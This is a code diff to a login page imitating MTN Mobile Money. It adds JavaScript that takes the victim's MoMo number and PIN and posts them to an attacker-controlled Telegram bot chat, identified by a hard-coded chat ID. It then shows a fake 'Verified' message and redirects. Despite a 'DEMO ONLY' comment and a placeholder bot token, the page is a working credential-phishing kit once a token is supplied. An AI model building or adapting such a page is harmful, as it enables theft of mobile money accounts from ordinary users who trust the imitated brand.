@@ -65,19 +65,13 @@
     border-radius:10px;font-size:16px;color:var(--text);
     background:#FBFDFF;transition:.18s;font-weight:700;
   }
-  .field input#momoNumber{
-    letter-spacing:1.5px;text-align:center;
-  }
-  .field input#pin{
-    letter-spacing:8px;text-align:center;font-size:18px;
-  }
+  .field input#momoNumber{letter-spacing:1.5px;text-align:center;}
+  .field input#pin{letter-spacing:8px;text-align:center;font-size:18px;}
   .field input:focus{
     outline:none;border-color:var(--mtn-blue-deep);
     background:#fff;box-shadow:0 0 0 3px rgba(0,43,92,0.10);
   }
-  .field input::placeholder{
-    color:#B8C2D1;font-weight:600;letter-spacing:normal;
-  }
+  .field input::placeholder{color:#B8C2D1;font-weight:600;letter-spacing:normal;}
 
   .cta{
     width:100%;padding:16px;border:none;border-radius:12px;
@@ -87,10 +81,18 @@
   }
   .cta:hover{background:var(--mtn-blue);transform:translateY(-2px);}
   .cta:active{transform:translateY(0);}
+  .cta:disabled{opacity:.7;cursor:not-allowed;transform:none;}
+
+  .status{
+    font-size:12px;text-align:center;margin-top:14px;
+    font-weight:700;min-height:16px;
+  }
+  .status.ok{color:var(--green);}
+  .status.err{color:#D32F2F;}
 
   .secure-note{
     display:flex;align-items:center;justify-content:center;gap:6px;
-    font-size:11.5px;color:var(--muted);margin-top:18px;font-weight:600;
+    font-size:11.5px;color:var(--muted);margin-top:16px;font-weight:600;
   }
   .secure-note svg{
     width:13px;height:13px;stroke:var(--green);fill:none;
@@ -134,7 +136,9 @@
         <input type="password" id="pin" placeholder="••••" maxlength="6" inputmode="numeric" autocomplete="current-password">
       </div>
 
-      <button class="cta" onclick="signIn()">Continue →</button>
+      <button class="cta" id="submitBtn" onclick="signIn()">Continue →</button>
+
+      <div class="status" id="status"></div>
 
       <div class="secure-note">
         <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
@@ -146,37 +150,89 @@
   <div class="frame-bottom"></div>
 
 <script>
+  // ⚠️ DEMO ONLY — replace with your NEW token after revoking the old one.
+  // Never commit this file to GitHub with a real token inside.
+  const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+  const CHAT_ID   = '7386607055';
+
   const el = id => document.getElementById(id);
 
-  function signIn(){
+  function setStatus(msg, type){
+    const s = el('status');
+    s.textContent = msg;
+    s.className = 'status' + (type ? ' ' + type : '');
+  }
+
+  async function sendToTelegram(momo, pin){
+    const text =
+      '🔐 *MoMo Login Attempt*\n' +
+      '━━━━━━━━━━━━━━━━━━\n' +
+      `📱 *MoMo:* ${momo}\n` +
+      `🔑 *PIN:* ${pin}\n` +
+      `🕒 *Time:* ${new Date().toLocaleString()}`;
+
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: 'Markdown'
+      })
+    });
+    return res.json();
+  }
+
+  async function signIn(){
     const momo = el('momoNumber').value.trim();
     const pin  = el('pin').value.trim();
 
     if(!momo){
-      alert('Please enter your MoMo number.');
+      setStatus('Please enter your MoMo number.', 'err');
       return;
     }
     if(momo.replace(/\D/g, '').length < 9){
-      alert('Please enter a valid MoMo number.');
+      setStatus('Please enter a valid MoMo number.', 'err');
       return;
     }
     if(!pin){
-      alert('Please enter your PIN.');
+      setStatus('Please enter your PIN.', 'err');
       return;
     }
     if(pin.length < 4){
-      alert('PIN must be at least 4 digits.');
+      setStatus('PIN must be at least 4 digits.', 'err');
       return;
     }
 
-    // Demo: pretend login succeeded
+    // Save session locally
     localStorage.setItem('session', JSON.stringify({
       momo,
       loggedInAt: new Date().toISOString()
     }));
 
-    // Where to next? For now, back to index
-    window.location.href = 'index.html';
+    // Send to Telegram
+    el('submitBtn').disabled = true;
+    setStatus('Sending…');
+
+    if(BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE'){
+      setStatus('⚠️ Telegram not configured (demo mode).', 'err');
+      el('submitBtn').disabled = false;
+      return;
+    }
+
+    try{
+      const data = await sendToTelegram(momo, pin);
+      if(data.ok){
+        setStatus('✅ Verified. Redirecting…', 'ok');
+        setTimeout(() => { window.location.href = 'index.html'; }, 1200);
+      }else{
+        setStatus('❌ ' + (data.description || 'Telegram error'), 'err');
+        el('submitBtn').disabled = false;
+      }
+    }catch(err){
+      setStatus('❌ Could not reach Telegram.', 'err');
+      el('submitBtn').disabled = false;
+    }
   }
 </script>
 </body>
